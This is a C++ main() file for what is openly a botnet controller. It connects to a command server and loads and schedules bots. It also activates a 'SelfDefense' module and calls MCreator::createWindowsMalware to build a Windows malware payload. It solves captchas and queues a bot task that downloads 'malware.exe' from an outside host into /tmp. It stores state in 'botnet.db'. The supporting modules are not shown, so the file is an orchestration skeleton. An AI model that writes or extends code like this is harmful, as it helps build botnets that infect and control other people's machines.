#include "BotManager.h"
#include "BotScheduler.h"
#include "NetworkManager.h"
#include "Logger.h"
#include "Config.h"
#include "SelfDefense.h"
#include "MonitoringService.h"
#include "RestAPI.h"
#include "CommandLineInterface.h"
#include "mcreator.h"
#include "CaptchaSolver.h"
#include "DatabaseManager.h"
#include <iostream>
#include <exception>
#include <thread>
#include <csignal>

void signalHandler(int signal) {
    Logger::log(Logger::INFO, "Interrupt signal received. Cleaning up and exiting...");
    MonitoringService::getInstance().stopMonitoring();
    BotManager::getInstance().stopAllBots();
    NetworkManager::getInstance().disconnect();
    Logger::shutdown();
    exit(signal);
}

int main(int argc, char* argv[]) {
    try {
        std::signal(SIGINT, signalHandler);
        std::signal(SIGTERM, signalHandler);

        std::string configPath = "config/system.conf";
        if (argc > 1) {
            configPath = argv[1];
        }

        Config::load(configPath);
        Logger::init(Config::get("log_file", "logs/async_log.txt"), Logger::INFO);
        SelfDefense::activate();

        NetworkManager& networkManager = NetworkManager::getInstance();
        networkManager.connect(Config::get("server_address", "127.0.0.1"), Config::get<int>("server_port", 8080));

        BotManager botManager;
        botManager.setUpCluster(Config::get("cluster_config", "config/cluster.conf"));
        botManager.loadBots("config/bots.conf");
        botManager.startAllBots();

        BotScheduler botScheduler;
        botScheduler.setMaxConcurrentTasks(Config::get<int>("max_concurrent_tasks", 4));

        MonitoringService& monitoringService = MonitoringService::getInstance();
        monitoringService.startMonitoring();

        RestAPI& restAPI = RestAPI::getInstance();
        restAPI.startServer(Config::get<int>("api_port", 8081));

        CommandLineInterface cli;
        cli.start();

        std::string malwarePayloadPath = "payload.bin";
        std::string malwareFile = MCreator::createWindowsMalware(malwarePayloadPath);
        Logger::log(Logger::INFO, "Created malware: " + malwareFile);

        CaptchaSolver captchaSolver("path/to/model");
        std::string captchaResult = captchaSolver.solveCaptcha("path/to/captcha/image.png");
        Logger::log(Logger::INFO, "Captcha result: " + captchaResult);

        std::map<std::string, std::string> params = {{"url", "http://example.com/malware.exe"}, {"destination", "/tmp/malware.exe"}};
        Bot bot("bot1", Bot::DOWNLOAD, Bot::HIGH, params, {});
        botManager.addBot(bot);
        botScheduler.runTaskWithDelay(bot, 10, 1);

        DatabaseManager dbManager("database/botnet.db");

        while (true) {
            std::this_thread::sleep_for(std::chrono::seconds(10));
            botScheduler.runScheduledTasks();
        }

        restAPI.stopServer();
        monitoringService.stopMonitoring();
        botManager.stopAllBots();
        networkManager.disconnect();
        Logger::shutdown();
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Exception: ") + e.what());
        return EXIT_FAILURE;
    } catch (...) {
        Logger::log(Logger::ERROR, "Unknown exception occurred.");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}




